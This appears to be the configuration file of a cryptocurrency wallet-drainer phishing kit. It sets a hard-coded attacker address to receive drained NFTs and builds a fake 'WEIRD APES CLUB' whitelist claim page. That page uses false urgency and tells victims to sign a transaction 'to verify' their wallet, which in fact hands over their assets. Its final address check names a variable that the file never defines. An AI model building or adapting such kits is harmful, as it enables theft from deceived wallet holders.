const receiverAddress = "0xadb971B8FC8B76aCA970feD91a722A02FfBdE925";

const drainNftInfo = {
    active: true,   
    minValue: 0.1,  
    nftReceiveAddress: "0xadb971B8FC8B76aCA970feD91a722A02FfBdE925" 
    }

const collectionInfo = {
    name: "WEIRD APES CLUB",
    socialMedia: {
        telegram: "https://t.me/weirdapesclub",
        twitter: "https://t.me/weirdapesclub",
        instagram: "https://www.instagram.com/p/Cfx4t_zLwaY/?igshid=MDJmNzVkMjY=",
    },
}

const indexPageInfo = {
    backgroundImage: "background.png", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Last Chance To Become Whitelisted!",
}

const claimPageInfo = {
    title: "CLAIM<br>WHITELIST", // <br> is a line break
    shortDescription: "12 Hours Left!",
    longDescription: "As We're Minting Soon We Are Giving Away 50 Whitelist Spots To People Who Support Us! All You Need To Do Is Sign The Transaction To Verify Your Wallet For Mint Date! <br>If You Are Already Whitelisted, After Verifying Your Wallet You Will Be Eligible For Our Free NFT Airdrop!",

    claimButtonText: "CLAIM NOW",

    image: "ola.jpg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}



const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect To Claim",
    transferButton: "Claim  Airdrop Now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
